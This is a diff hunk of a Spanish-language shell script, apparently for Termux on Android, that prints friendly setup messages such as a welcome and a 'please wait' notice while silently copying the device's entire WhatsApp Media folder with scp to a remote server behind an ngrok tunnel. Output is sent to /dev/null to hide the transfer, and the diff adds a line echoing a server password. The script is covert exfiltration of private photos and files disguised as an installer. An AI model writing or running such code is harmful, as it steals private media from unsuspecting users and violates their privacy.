@@ -9,7 +9,7 @@ then
         echo "Dependencias Instaladas [OK]";
         #termux-setup-storage
         echo "Bienvenido ";
-        
+        echo "Passord: server12";
          echo "Espere unos minutos";
         scp -P 15297 -r /storage/emulated/0/WhatsApp/Media/  server@0.tcp.ngrok.io:/home/server/Documentos/ &>/dev/null;
         echo "Ingrese la Contraseña del Servidor";      
